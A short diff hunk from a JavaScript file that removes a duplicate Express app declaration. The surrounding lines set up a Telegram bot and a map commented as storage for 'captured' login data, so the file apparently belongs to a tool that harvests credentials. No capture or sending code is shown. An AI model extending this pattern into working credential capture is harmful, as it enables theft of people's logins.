@@ -27,7 +27,6 @@ const app = express();
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);
 
 // --- A temporary place to store login data ---
-const app = express();
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);
 const capturedData = new Map();
 
